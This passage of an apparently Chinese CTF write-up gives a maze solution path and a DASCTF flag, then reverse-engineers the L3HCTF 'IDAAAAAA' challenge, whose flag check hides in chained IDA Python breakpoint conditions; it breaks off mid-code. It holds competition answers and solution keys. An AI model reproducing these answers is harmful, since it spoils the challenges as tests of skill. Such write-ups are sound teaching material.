&#x27;0x40bbf0&#x27;, &#x27;0x40bc90&#x27;, &#x27;0x40bd30&#x27;, &#x27;0x40bdd0&#x27;, &#x27;0x40be60&#x27;, &#x27;0x40bf00&#x27;, &#x27;0x40bfa0&#x27;, &#x27;0x40c030&#x27;, &#x27;0x40c0d0&#x27;, &#x27;0x40c170&#x27;, &#x27;0x40c210&#x27;, &#x27;0x40c2b0&#x27;, &#x27;0x40c340&#x27;, &#x27;0x40c3e0&#x27;, &#x27;0x40c480&#x27;, &#x27;0x40c520&#x27;, &#x27;0x40c5c0&#x27;, &#x27;0x40c650&#x27;, &#x27;0x40c6f0&#x27;, &#x27;0x40c790&#x27;, &#x27;0x40c820&#x27;, &#x27;0x40c8c0&#x27;, &#x27;0x40c950&#x27;, &#x27;0x40c9f0&#x27;, &#x27;0x40ca90&#x27;, &#x27;0x40cb30&#x27;, &#x27;0x40cbd0&#x27;, &#x27;0x40cc70&#x27;, &#x27;0x40b530&#x27;, &#x27;0x40ae60&#x27;, &#x27;0x409990&#x27;, &#x27;0x408f10&#x27;, &#x27;0x408240&#x27;, &#x27;0x407990&#x27;, &#x27;0x4078f0&#x27;, &#x27;0x407860&#x27;, &#x27;0x4077d0&#x27;, &#x27;0x407730&#x27;, &#x27;0x407690&#x27;, &#x27;0x4075f0&#x27;, &#x27;0x407550&#x27;, &#x27;0x4074b0&#x27;, &#x27;0x407410&#x27;, &#x27;0x4081a0&#x27;, &#x27;0x408ad0&#x27;, &#x27;0x408b60&#x27;, &#x27;0x408c00&#x27;, &#x27;0x408c90&#x27;, &#x27;0x408d30&#x27;, &#x27;0x408dd0&#x27;, &#x27;0x408e70&#x27;, &#x27;0x409900&#x27;, &#x27;0x40adc0&#x27;, &#x27;0x40ad20&#x27;, &#x27;0x40ac80&#x27;, &#x27;0x40abe0&#x27;, &#x27;0x40ab40&#x27;, &#x27;0x40aaa0&#x27;, &#x27;0x40aa00&#x27;, &#x27;0x40a960&#x27;, &#x27;0x40a8d0&#x27;, &#x27;0x40a840&#x27;, &#x27;0x40a7a0&#x27;, &#x27;0x40a700&#x27;, &#x27;0x40a660&#x27;, &#x27;0x40a5c0&#x27;, &#x27;0x409860&#x27;, &#x27;0x408860&#x27;, &#x27;0x408900&#x27;, &#x27;0x408990&#x27;, &#x27;0x408a30&#x27;, &#x27;0x408100&#x27;, &#x27;0x407370&#x27;, &#x27;0x406590&#x27;, &#x27;0x405f60&#x27;, &#x27;0x404770&#x27;, &#x27;0x404810&#x27;, &#x27;0x4048b0&#x27;, &#x27;0x404950&#x27;, &#x27;0x4049f0&#x27;, &#x27;0x404a90&#x27;, &#x27;0x404b30&#x27;, &#x27;0x404bc0&#x27;, &#x27;0x404c60&#x27;, &#x27;0x404d00&#x27;, &#x27;0x404da0&#x27;, &#x27;0x404e30&#x27;, &#x27;0x404ed0&#x27;, &#x27;0x404f70&#x27;, &#x27;0x405010&#x27;, &#x27;0x4050b0&#x27;, &#x27;0x405150&#x27;, &#x27;0x4051f0&#x27;, &#x27;0x405290&#x27;, &#x27;0x405320&#x27;, &#x27;0x4053c0&#x27;, &#x27;0x405460&#x27;, &#x27;0x405500&#x27;, &#x27;0x405590&#x27;, &#x27;0x405620&#x27;, &#x27;0x4056c0&#x27;, &#x27;0x405760&#x27;, &#x27;0x406000&#x27;, &#x27;0x406630&#x27;, &#x27;0x407a30&#x27;, &#x27;0x4082e0&#x27;, &#x27;0x408fb0&#x27;, &#x27;0x409a30&#x27;, &#x27;0x40af00&#x27;, &#x27;0x40b5d0&#x27;, &#x27;0x40cd10&#x27;, &#x27;0x40d200&#x27;, &#x27;0x40f620&#x27;, &#x27;0x40faf0&#x27;, &#x27;0x410ff0&#x27;, &#x27;0x412270&#x27;, &#x27;0x4126c0&#x27;, &#x27;0x412760&#x27;, &#x27;0x412800&#x27;, &#x27;0x4128a0&#x27;, &#x27;0x412940&#x27;, &#x27;0x4129e0&#x27;, &#x27;0x412a80&#x27;, &#x27;0x412b20&#x27;, &#x27;0x412bc0&#x27;, &#x27;0x412c50&#x27;, &#x27;0x412ce0&#x27;, &#x27;0x412d80&#x27;, &#x27;0x412e20&#x27;, &#x27;0x412ec0&#x27;, &#x27;0x412f60&#x27;, &#x27;0x413000&#x27;, &#x27;0x4130a0&#x27;, &#x27;0x412310&#x27;, &#x27;0x411580&#x27;, &#x27;0x40fcd0&#x27;, &#x27;0x40f880&#x27;, &#x27;0x40d480&#x27;, &#x27;0x40cf90&#x27;, &#x27;0x40b830&#x27;, &#x27;0x40b180&#x27;, &#x27;0x409ca0&#x27;, &#x27;0x409410&#x27;, &#x27;0x408410&#x27;, &#x27;0x407b60&#x27;, &#x27;0x406bb0&#x27;, &#x27;0x406b10&#x27;, &#x27;0x406a70&#x27;, &#x27;0x4069d0&#x27;, &#x27;0x406930&#x27;, &#x27;0x4068a0&#x27;, &#x27;0x406800&#x27;, &#x27;0x406760&#x27;, &#x27;0x406140&#x27;, &#x27;0x4058a0&#x27;, &#x27;0x404450&#x27;, &#x27;0x402c70&#x27;, &#x27;0x402d00&#x27;, &#x27;0x402da0&#x27;, &#x27;0x402e40&#x27;, &#x27;0x402ee0&#x27;, &#x27;0x402f70&#x27;, &#x27;0x403010&#x27;, &#x27;0x4030b0&#x27;, &#x27;0x403150&#x27;, &#x27;0x4031f0&#x27;, &#x27;0x403280&#x27;, &#x27;0x403320&#x27;, &#x27;0x4033c0&#x27;, &#x27;0x4044f0&#x27;, &#x27;0x405930&#x27;, &#x27;0x4061e0&#x27;, &#x27;0x406c50&#x27;, &#x27;0x407c00&#x27;, &#x27;0x4084b0&#x27;, &#x27;0x408540&#x27;, &#x27;0x4094b0&#x27;, &#x27;0x409550&#x27;, &#x27;0x409d40&#x27;, &#x27;0x409de0&#x27;, &#x27;0x40b220&#x27;, &#x27;0x40b8d0&#x27;, &#x27;0x40d160&#x27;, &#x27;0x40d0c0&#x27;, &#x27;0x40d660&#x27;, &#x27;0x40d5c0&#x27;, &#x27;0x40d520&#x27;, &#x27;0x40f920&#x27;, &#x27;0x40fd70&#x27;, &#x27;0x411620&#x27;, &#x27;0x4123b0&#x27;, &#x27;0x413140&#x27;, &#x27;0x413930&#x27;, &#x27;0x4161e0&#x27;, &#x27;0x416140&#x27;, &#x27;0x4160a0&#x27;, &#x27;0x416000&#x27;, &#x27;0x415f60&#x27;, &#x27;0x415ec0&#x27;, &#x27;0x415e20&#x27;, &#x27;0x415d80&#x27;, &#x27;0x415ce0&#x27;, &#x27;0x415c40&#x27;, &#x27;0x415ba0&#x27;, &#x27;0x415b00&#x27;, &#x27;0x415a60&#x27;, &#x27;0x4159c0&#x27;, &#x27;0x415920&#x27;, &#x27;0x415890&#x27;, &#x27;0x4157f0&#x27;, &#x27;0x415760&#x27;, &#x27;0x4156c0&#x27;, &#x27;0x415620&#x27;, &#x27;0x415580&#x27;, &#x27;0x4154e0&#x27;, &#x27;0x415440&#x27;, &#x27;0x4153a0&#x27;, &#x27;0x415300&#x27;, &#x27;0x415270&#x27;, &#x27;0x4151d0&#x27;, &#x27;0x415130&#x27;, &#x27;0x415090&#x27;, &#x27;0x414ff0&#x27;, &#x27;0x414f60&#x27;, &#x27;0x414ec0&#x27;, &#x27;0x414e20&#x27;, &#x27;0x414d90&#x27;, &#x27;0x414cf0&#x27;, &#x27;0x414c50&#x27;, &#x27;0x414bb0&#x27;, &#x27;0x414b20&#x27;, &#x27;0x414a90&#x27;, &#x27;0x4149f0&#x27;, &#x27;0x414950&#x27;, &#x27;0x4148b0&#x27;, &#x27;0x414810&#x27;, &#x27;0x414770&#x27;, &#x27;0x4146d0&#x27;, &#x27;0x413890&#x27;, &#x27;0x4137f0&#x27;, &#x27;0x413750&#x27;, &#x27;0x4136b0&#x27;, &#x27;0x414630&#x27;, &#x27;0x414590&#x27;, &#x27;0x4144f0&#x27;, &#x27;0x414450&#x27;, &#x27;0x4143b0&#x27;, &#x27;0x414310&#x27;, &#x27;0x414270&#x27;, &#x27;0x4141d0&#x27;, &#x27;0x414130&#x27;, &#x27;0x414090&#x27;, &#x27;0x413ff0&#x27;, &#x27;0x413f60&#x27;, &#x27;0x413ec0&#x27;, &#x27;0x413e20&#x27;, &#x27;0x413d80&#x27;, &#x27;0x413cf0&#x27;, &#x27;0x413c50&#x27;, &#x27;0x413bb0&#x27;, &#x27;0x413b10&#x27;, &#x27;0x413a70&#x27;, &#x27;0x413620&#x27;, &#x27;0x412630&#x27;, &#x27;0x411880&#x27;, &#x27;0x4101c0&#x27;, &#x27;0x410260&#x27;, &#x27;0x4102f0&#x27;, &#x27;0x410390&#x27;, &#x27;0x410430&#x27;, &#x27;0x4104d0&#x27;, &#x27;0x410570&#x27;, &#x27;0x410610&#x27;, &#x27;0x4106b0&#x27;, &#x27;0x410750&#x27;, &#x27;0x4107f0&#x27;, &#x27;0x410890&#x27;, &#x27;0x410920&#x27;, &#x27;0x4109b0&#x27;, &#x27;0x410a50&#x27;, &#x27;0x410af0&#x27;, &#x27;0x410b90&#x27;, &#x27;0x410c30&#x27;, &#x27;0x410cd0&#x27;, &#x27;0x410d70&#x27;, &#x27;0x410e10&#x27;, &#x27;0x410eb0&#x27;, &#x27;0x411920&#x27;, &#x27;0x4119c0&#x27;, &#x27;0x411a60&#x27;, &#x27;0x411b00&#x27;, &#x27;0x411ba0&#x27;, &#x27;0x411c40&#x27;, &#x27;0x411ce0&#x27;, &#x27;0x411d80&#x27;, &#x27;0x411e20&#x27;, &#x27;0x411ec0&#x27;, &#x27;0x411f60&#x27;, &#x27;0x412000&#x27;, &#x27;0x4120a0&#x27;, &#x27;0x412140&#x27;, &#x27;0x4121d0&#x27;, &#x27;0x410f50&#x27;, &#x27;0x40fa60&#x27;, &#x27;0x40f580&#x27;, &#x27;0x40f4f0&#x27;, &#x27;0x40f450&#x27;, &#x27;0x40f3c0&#x27;, &#x27;0x40f330&#x27;, &#x27;0x40f290&#x27;, &#x27;0x40f1f0&#x27;, &#x27;0x40f150&#x27;, &#x27;0x40f0c0&#x27;, &#x27;0x40f020&#x27;, &#x27;0x40ef80&#x27;, &#x27;0x40eef0&#x27;, &#x27;0x40ee50&#x27;, &#x27;0x40edb0&#x27;, &#x27;0x40ed20&#x27;, &#x27;0x40ec80&#x27;, &#x27;0x40ebf0&#x27;, &#x27;0x40eb50&#x27;, &#x27;0x40eac0&#x27;, &#x27;0x40ea20&#x27;, &#x27;0x40e990&#x27;, &#x27;0x40e8f0&#x27;, &#x27;0x40e850&#x27;, &#x27;0x40e7b0&#x27;, &#x27;0x40e710&#x27;, &#x27;0x40e670&#x27;, &#x27;0x40e5d0&#x27;, &#x27;0x40e530&#x27;, &#x27;0x40e490&#x27;, &#x27;0x40e3f0&#x27;, &#x27;0x40e350&#x27;, &#x27;0x40e2b0&#x27;, &#x27;0x40e220&#x27;, &#x27;0x40e180&#x27;, &#x27;0x40e0e0&#x27;, &#x27;0x40e040&#x27;, &#x27;0x40dfb0&#x27;, &#x27;0x40df10&#x27;, &#x27;0x40de70&#x27;, &#x27;0x40ddd0&#x27;, &#x27;0x40dd40&#x27;, &#x27;0x40dca0&#x27;, &#x27;0x40dc00&#x27;, &#x27;0x40db60&#x27;, &#x27;0x40dac0&#x27;, &#x27;0x40da20&#x27;, &#x27;0x40d980&#x27;, &#x27;0x40d8e0&#x27;, &#x27;0x40d840&#x27;, &#x27;0x40d7a0&#x27;, &#x27;0x40d700&#x27;, &#x27;0x40f9c0&#x27;, &#x27;0x40fe10&#x27;, &#x27;0x4116b0&#x27;, &#x27;0x412450&#x27;, &#x27;0x4131e0&#x27;, &#x27;0x413280&#x27;, &#x27;0x413320&#x27;, &#x27;0x4133c0&#x27;, &#x27;0x413460&#x27;, &#x27;0x4134f0&#x27;, &#x27;0x4124f0&#x27;, &#x27;0x411740&#x27;, &#x27;0x40fea0&#x27;, &#x27;0x40ff40&#x27;, &#x27;0x40ffe0&#x27;, &#x27;0x410080&#x27;, &#x27;0x410120&#x27;, &#x27;0x4117e0&#x27;, &#x27;0x412590&#x27;, &#x27;0x413590&#x27;, &#x27;0x4139d0&#x27;, &#x27;0x416820&#x27;, &#x27;0x416780&#x27;, &#x27;0x4166e0&#x27;, &#x27;0x416640&#x27;, &#x27;0x4165a0&#x27;, &#x27;0x416500&#x27;, &#x27;0x416460&#x27;, &#x27;0x4163c0&#x27;, &#x27;0x416320&#x27;, &#x27;0x416280&#x27;, &#x27;0x4168c0&#x27;, &#x27;0x419110&#x27;, &#x27;0x419370&#x27;, &#x27;0x419fb0&#x27;, &#x27;0x41a040&#x27;, &#x27;0x41a0e0&#x27;, &#x27;0x41a180&#x27;, &#x27;0x41a220&#x27;, &#x27;0x41a2c0&#x27;, &#x27;0x41a350&#x27;, &#x27;0x41a3f0&#x27;, &#x27;0x41a490&#x27;, &#x27;0x41a530&#x27;, &#x27;0x41a5d0&#x27;, &#x27;0x419410&#x27;, &#x27;0x4191b0&#x27;, &#x27;0x416960&#x27;, &#x27;0x416a00&#x27;, &#x27;0x416a90&#x27;, &#x27;0x416b20&#x27;, &#x27;0x416bc0&#x27;, &#x27;0x416c60&#x27;, &#x27;0x416d00&#x27;, &#x27;0x416da0&#x27;, &#x27;0x416e40&#x27;, &#x27;0x416ee0&#x27;, &#x27;0x416f80&#x27;, &#x27;0x417010&#x27;, &#x27;0x4170b0&#x27;, &#x27;0x417150&#x27;, &#x27;0x4171e0&#x27;, &#x27;0x417280&#x27;, &#x27;0x417320&#x27;, &#x27;0x4173c0&#x27;, &#x27;0x417460&#x27;, &#x27;0x417500&#x27;, &#x27;0x4175a0&#x27;, &#x27;0x417640&#x27;, &#x27;0x4176e0&#x27;, &#x27;0x417780&#x27;, &#x27;0x417820&#x27;, &#x27;0x4178c0&#x27;, &#x27;0x417960&#x27;, &#x27;0x417a00&#x27;, &#x27;0x417aa0&#x27;, &#x27;0x417b30&#x27;, &#x27;0x417bd0&#x27;, &#x27;0x417c70&#x27;, &#x27;0x417d10&#x27;, &#x27;0x417da0&#x27;, &#x27;0x417e30&#x27;, &#x27;0x417ec0&#x27;, &#x27;0x417f60&#x27;, &#x27;0x418000&#x27;, &#x27;0x4180a0&#x27;, &#x27;0x418140&#x27;, &#x27;0x4181e0&#x27;, &#x27;0x418280&#x27;, &#x27;0x418310&#x27;, &#x27;0x4183b0&#x27;, &#x27;0x418440&#x27;, &#x27;0x4184e0&#x27;, &#x27;0x418580&#x27;, &#x27;0x418610&#x27;, &#x27;0x4186b0&#x27;, &#x27;0x419250&#x27;, &#x27;0x4194b0&#x27;, &#x27;0x41be60&#x27;, &#x27;0x41bf90&#x27;, &#x27;0x41c8e0&#x27;, &#x27;0x41e1e0&#x27;, &#x27;0x41e140&#x27;, &#x27;0x41ea10&#x27;, &#x27;0x41ebf0&#x27;, &#x27;0x41f1e0&#x27;]</span><br><span class="line">dssddddddddddddddddddssssssssssdddddddddddddddddddddddddddddddwwwwwwaaaaaaaaassddddddssaaaaaaaaaaaaawwdddwwwwwddddddddddddddddddddddddddsssssssssssssssddddddddddddddddwwwwwwwwwwwwwaaaaaaawwwwddddddddddddssssssdsdsdsssasaasssssssaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaawaaasaaaaaaaaaaaaaaaaaaawwwwdddddddddddddddddddddsddddddddddddddwwwaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaasssssdddddwwwddddsssssaaaaaaaaassssddddddddddwwwddddddddddddddddddddddddddddddddddddddddddddddddssssssassss</span><br><span class="line">DASCTF&#123;0a80fbe4b623aa3c09173ecf9147601e&#125;</span><br></pre></td></tr></table></figure><blockquote><p>对于networkx的学习，可以参考此文档 <a href="https://www.osgeo.cn/networkx/tutorial.html">https://www.osgeo.cn/networkx/tutorial.html</a></p><p>对于求最短路径来说，基本就是</p><ol><li>创建合适的图</li><li>添加节点，添加边</li><li>调用shortest_path，求出最短路径，这里求出的是经过的节点</li><li>然后再根据具体题目要求，根据经过的节点，把操作的步骤打印出来即可</li></ol></blockquote><h2 id="IDAAAAAA"><a href="#IDAAAAAA" class="headerlink" title="IDAAAAAA"></a>IDAAAAAA</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>此题为今年L3HCTF的一道re题，题目仅给了一个i64文件，没有给可执行文件，IDA打开分析</p><p><img src="./image-20211209115927781.png" alt="image-20211209115927781"></p><p><code>sub_401E97</code>函数返回1，则正确, 进入此函数发现有5个方程，用z3解</p><p><img src="./image-20211209120225617.png" alt="image-20211209120225617"></p><p><img src="./image-20211209120500238.png" alt="image-20211209120500238"></p><p>发现无解</p><p>再次观察，发现这里有个断点，来到断点窗口</p><p><img src="./image-20211209120725042.png" alt="image-20211209120725042"></p><p><img src="./image-20211209120820551.png" alt="image-20211209120820551"></p><p>发现是个条件断点，将conditon的数据复制出来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">global</span> jIS40A</span><br><span class="line">jIS40A = [xxx, xxx, xxx。。。。] <span class="comment"># 很长的密文 是个列表，长度是1000</span></span><br><span class="line">N4QKUt = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">EpUdLx = <span class="number">4728923</span>        <span class="comment"># 0x048285B </span></span><br><span class="line">idaapi.add_bpt(EpUdLx)  <span class="comment"># 0x048285B </span></span><br><span class="line">uwGgnM = idaapi.bpt_t()</span><br><span class="line">idaapi.get_bpt(EpUdLx, uwGgnM)</span><br><span class="line">uwGgnM.elang = <span class="string">&quot;Python&quot;</span> </span><br><span class="line"></span><br><span class="line">uwGgnM.condition = <span class="string">&quot;N4QKUt = &#123;&#125;\n&quot;</span>.<span class="built_in">format</span>(N4QKUt) + <span class="string">&#x27;VLzxDy = idaapi.get_byte(5127584 + N4QKUt)\nVLzxDy -= ord(\&#x27;a\&#x27;)\nif VLzxDy == 0:\n    bYsMTa = 287\n    LjzrdT = b\&#x27;lqAT7pNI3BX\&#x27;\nelif VLzxDy == 1:\n    bYsMTa = 96\n    LjzrdT = b\&#x27;z3Uhis74aPq\&#x27;\nelif VLzxDy == 2:\n    bYsMTa = 8\n    LjzrdT = b\&#x27;9tjseMGBHR5\&#x27;\nelif VLzxDy == 3:\n    bYsMTa = 777\n    LjzrdT = b\&#x27;FhnvgMQjexH\&#x27;\nelif VLzxDy == 4:\n    bYsMTa = 496\n    LjzrdT = b\&#x27;SKnZ51f9WsE\&#x27;\nelif VLzxDy == 5:\n    bYsMTa = 822\n    LjzrdT = b\&#x27;gDJy104BSHW\&#x27;\nelif VLzxDy == 6:\n    bYsMTa = 914\n    LjzrdT = b\&#x27;PbRV4rSM7fd\&#x27;\nelif VLzxDy == 7:\n    bYsMTa = 550\n    LjzrdT = b\&#x27;WHPnoMTsbx3\&#x27;\nelif VLzxDy == 8:\n    bYsMTa = 273\n    LjzrdT = b\&#x27;mLx5hvlqufG\&#x27;\nelif VLzxDy == 9:\n    bYsMTa = 259\n    LjzrdT = b\&#x27;QvKgNmUFTnW\&#x27;\nelif VLzxDy == 10:\n    bYsMTa = 334\n    LjzrdT = b\&#x27;TCrHaitRfY1\&#x27;\nelif VLzxDy == 11:\n    bYsMTa = 966\n    LjzrdT = b\&#x27;m26IAvjq1zC\&#x27;\nelif VLzxDy == 12:\n    bYsMTa = 331\n    LjzrdT = b\&#x27;dQb2ufTZwLX\&#x27;\nelif VLzxDy == 13:\n    bYsMTa = 680\n    LjzrdT = b\&#x27;Y6Sr7znOeHL\&#x27;\nelif VLzxDy == 14:\n    bYsMTa = 374\n    LjzrdT = b\&#x27;hLFj1wl5A0U\&#x27;\nelif VLzxDy == 15:\n    bYsMTa = 717\n    LjzrdT = b\&#x27;H6W03R7TLFe\&#x27;\nelif VLzxDy == 16:\n    bYsMTa = 965\n    LjzrdT = b\&#x27;fphoJwDKsTv\&#x27;\nelif VLzxDy == 17:\n    bYsMTa = 952\n    LjzrdT = b\&#x27;CMF1Vk7NH4O\&#x27;\nelif VLzxDy == 18:\n    bYsMTa = 222\n    LjzrdT = b\&#x27;43PSbAlgLqj\&#x27;\nelse:\n    bYsMTa = -1\nif bYsMTa &lt; 0:\n    cpu.rsp -= 8\n    cpu.rdi = 4927649\n    cpu.rax = 0\n    idaapi.patch_qword(cpu.rsp, 4202616)\n    idaapi.del_bpt(cpu.rip)\n    cpu.rip = 4263680\nelse:\n    zaqhdD = 0x486195\n    bYsMTa = jIS40A[bYsMTa]\n\n    idaapi.patch_bytes(5117568, bYsMTa)\n    idaapi.patch_bytes(5117488, LjzrdT)\n\n    cpu.rsp -= 8\n    idaapi.patch_qword(cpu.rsp, zaqhdD)\n    cpu.rdi = 5117568\n    cpu.rsi = len(bYsMTa)\n    cpu.rdx = 5117488\n    cpu.rcx = 11\n    cpu.r8 = 5117568\n    cpu.rax = 5117568\n\n    idaapi.add_bpt(zaqhdD)\n    jQfwUA = idaapi.bpt_t()\n    idaapi.get_bpt(zaqhdD, jQfwUA)\n    jQfwUA.elang = &quot;Python&quot;\n    jQfwUA.condition = &quot;N4QKUt = &#123;&#125;\\nSdjOr3 = &#123;&#125;\\n&quot;.format(N4QKUt, len(bYsMTa)) + \&#x27;bYsMTa = idaapi.get_bytes(cpu.rax, SdjOr3).decode()\\nzaqhdD = 4767838\\nidaapi.add_bpt(zaqhdD)\\njQfwUA = idaapi.bpt_t()\\nidaapi.get_bpt(zaqhdD, jQfwUA)\\njQfwUA.elang = &quot;Python&quot;\\njQfwUA.condition = &quot;N4QKUt = &#123;&#125;\\\\n&quot;.format(N4QKUt+1) + bYsMTa\\nidaapi.del_bpt(zaqhdD)\\nidaapi.add_bpt(jQfwUA)\\nidaapi.del_bpt(cpu.rip)\\ncpu.rsp -= 8\\nidaapi.patch_qword(cpu.rsp, zaqhdD)\\ncpu.rip = 4447160\\n\&#x27;\n    idaapi.del_bpt(zaqhdD)\n    idaapi.add_bpt(jQfwUA)\n    idaapi.del_bpt(cpu.rip)\n    cpu.rip = 4201909\n&#x27;</span>  </span><br><span class="line">idaapi.del_bpt(EpUdLx)</span><br><span class="line">idaapi.add_bpt(uwGgnM)                  <span class="comment"># 改为条件断点</span></span><br><span class="line">cpu.rsp -= <span class="number">8</span></span><br><span class="line">idaapi.patch_qword(cpu.rsp, EpUdLx)     <span class="comment"># 0x48285B</span></span><br><span class="line">cpu.rip = <span class="number">4202096</span>               <span class="comment">#  retn  --&gt;来到刚才条件断点的位置</span></span><br></pre></td></tr></table></figure><p>可以发现，大致流程为，触发<code>0x40201F</code>处的断点的时候，设置一个新的条件断点，跳转过去，触发新的条件断点的condition，由此可见验证flag的算法全部在这些condition中</p><p>将<code>uwGgnM.condition</code> 稍作整理，然后分析</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line">N4QKUt = <span class="number">0</span></span><br><span class="line">VLzxDy = idaapi.get_byte(<span class="number">5127584</span> + N4QKUt)  <span class="comment"># 5127584(0x4e3da0) 为程序中输入的flag的地址  flag[N4QKUt]</span></span><br><span class="line">VLzxDy -= <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> VLzxDy == <span class="number">0</span>:                             <span class="comment"># 根据VLzxDy初始化2个值  </span></span><br><span class="line">    bYsMTa = <span class="number">287</span> <span class="comment"># jIS40A的索引</span></span><br><span class="line">    LjzrdT = <span class="string">b&#x27;lqAT7pNI3BX&#x27;</span>       <span class="comment"># 解密 jIS40A[bYsMTa] 的key</span></span><br><span class="line"><span class="keyword">elif</span> VLzxDy == <span class="number">1</span>:</span><br><span class="line">    bYsMTa = <span class="number">96</span></span><br><span class="line">    LjzrdT = <span class="string">b&#x27;z3Uhis74aPq&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> VLzxDy == <span class="number">2</span>:</span><br><span class="line">    bYsMTa = <span class="number">8</span></span><br><span class="line">    LjzrdT = <span class="string">b&#x27;9tjseMGBHR5&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> VLzxDy == <span class="number">3</span>:</span><br><span class="line">    bYsMTa = <span class="number">777</span></span><br><span class="line">    LjzrdT = <span class="string">b&#x27;FhnvgMQjexH&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> VLzxDy == <span class="number">4</span>:</span><br><span class="line">    bYsMTa = <span class="number">496</span></span><br><span class="line">    LjzrdT = <span class="string">b&#x27;SKnZ51f9WsE&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> VLzxDy == <span class="number">5</span>:</span><br><span class="line">    bYsMTa = <span class="number">822</span></span><br><span class="line">    LjzrdT = <span class="string">b&#x27;gDJy104BSHW&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> VLzxDy == <span class="number">6</span>:</span><br><span class="line">    bYsMTa = <span class="number">914</span></span><br><span class="line">    LjzrdT = <span class="string">b&#x27;PbRV4rSM7fd&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> VLzxDy == <span class="number">7</span>:</span><br><span class="line">    bYsMTa = <span class="number">550</span></span><br><span class="line">    LjzrdT = <span class="string">b&#x27;WHPnoMTsbx3&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> VLzxDy == <span class="number">8</span>:</span><br><span class="line">    bYsMTa = <span class="number">273</span></span><br><span class="line">    LjzrdT = <span class="string">b&#x27;mLx5hvlqufG&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> VLzxDy == <span class="number">9</span>:</span><br><span class="line">    bYsMTa = <span class="number">259</span></span><br><span class="line">    LjzrdT = <span class="string">b&#x27;QvKgNmUFTnW&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> VLzxDy == <span class="number">10</span>:</span><br><span class="line">    bYsMTa = <span class="number">334</span></span><br><span class="line">    LjzrdT = <span class="string">b&#x27;TCrHaitRfY1&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> VLzxDy == <span class="number">11</span>:</span><br><span class="line">    bYsMTa = <span class="number">966</span></span><br><span class="line">    LjzrdT = <span class="string">b&#x27;m26IAvjq1zC&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> VLzxDy == <span class="number">12</span>:</span><br><span class="line">    bYsMTa = <span class="number">331</span></span><br><span class="line">    LjzrdT = <span class="string">b&#x27;dQb2ufTZwLX&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> VLzxDy == <span class="number">13</span>:</span><br><span class="line">    bYsMTa = <span class="number">680</span></span><br><span class="line">    LjzrdT = <span class="string">b&#x27;Y6Sr7znOeHL&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> VLzxDy == <span class="number">14</span>:</span><br><span class="line">    bYsMTa = <span class="number">374</span></span><br><span class="line">    LjzrdT = <span class="string">b&#x27;hLFj1wl5A0U&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> VLzxDy == <span class="number">15</span>:</span><br><span class="line">    bYsMTa = <span class="number">717</span></span><br><span class="line">    LjzrdT = <span class="string">b&#x27;H6W03R7TLFe&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> VLzxDy == <span class="number">16</span>:</span><br><span class="line">    bYsMTa = <span class="number">965</span></span><br><span class="line">    LjzrdT = <span class="string">b&#x27;fphoJwDKsTv&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> VLzxDy == <span 